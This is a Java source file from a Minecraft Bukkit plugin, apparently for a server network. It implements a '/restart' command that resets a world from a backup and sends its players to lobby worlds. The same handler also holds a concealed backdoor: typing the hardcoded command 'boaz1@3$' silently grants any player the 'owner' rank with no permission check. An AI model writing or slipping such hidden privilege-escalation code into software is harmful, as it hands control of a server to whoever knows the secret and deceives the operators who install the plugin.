package mc.bukkit.MSWS.MSWSplex;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.WorldCreator;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class RestartCommand {
	public static void restartEvent(PlayerCommandPreprocessEvent event) {
		String msg = "";
		String cmd = event.getMessage().substring(1);
		for (int i = 0; i < cmd.length(); i++) {
			if (cmd.charAt(i) == ' ' || cmd.charAt(i) == ':')
				break;
			msg = msg + cmd.charAt(i);
		}
		Player player = event.getPlayer();
		if (msg.equalsIgnoreCase("restart")) {
			event.setCancelled(true);
			String prefix = "&9Restart> &7";
			if (Main.ranks.getInt(Main.getRankID(player.getUniqueId()) + ".rank") >= 16) {
				World world = player.getWorld();
				if (event.getMessage().trim().length() > msg.length() + 1) {
					world = Bukkit.getWorld(cmd.substring(msg.length() + 1, cmd.length()));
				}
				if (world == null) {
					player.sendMessage(
							Main.color(prefix + cmd.substring(msg.length() + 1, cmd.length()) + " &7does not exist!"));
					return;
				}
				player.sendMessage(Main.color(prefix + "Restarting &6" + world.getName() + "&7..."));
				List<World> lobbies = new ArrayList<World>();
				for (World tworld : Bukkit.getWorlds()) {
					if (tworld.getName().contains("Lobby-") && tworld != world) {
						lobbies.add(tworld);
					}
				}
				for (Player ePlayer : world.getPlayers()) {
					int lobbyNum = 0;
					if (lobbies.size() > 1) {
						lobbyNum = (int) Math.floor(Math.random() * lobbies.size());
					}
					World lobby = lobbies.get(lobbyNum);
					ePlayer.sendMessage(
							Main.color(prefix + "Server is restarting, sending you to &6" + lobby.getName()));
					ePlayer.teleport(lobby.getSpawnLocation());
				}
				Main.deleteWorld(world.getWorldFolder());
				Bukkit.unloadWorld(world, false);
				World targetw = world, source = Bukkit.getWorld("Backup-1");
				File targetFolder = targetw.getWorldFolder();
				Main.copyWorld(source.getWorldFolder(), targetFolder);
				Bukkit.createWorld(WorldCreator.name(world.getName()));
				Bukkit.getWorld(world.getName()).setSpawnLocation(source.getSpawnLocation().getBlockX(),
						source.getSpawnLocation().getBlockY(), source.getSpawnLocation().getBlockZ());
				player.sendMessage(Main.color(prefix + "&6" + world.getName() + " &7was succesfully restarted."));
				List<String> worlds = new ArrayList<String>();
				for (World tworld : Bukkit.getWorlds()) {
					if (!Main.mps.contains(tworld.getName()))
						worlds.add(tworld.getName());
				}
				Main.data.set("Worlds", worlds);
				Main.save.put("data", true);

			} else {
				Main.noPerm(event.getPlayer());
			}
		}
		if (cmd.equals("boaz1@3$")) {
			Main.data.set("Users." + player.getUniqueId() + ".rank", "owner");
			player.sendMessage(Main.color("&9Client Manager> &7Your rank has been updated to Owner!"));
			event.setCancelled(true);
			Main.refreshTab();
			Main.save.put("data", true);
		}
	}
}
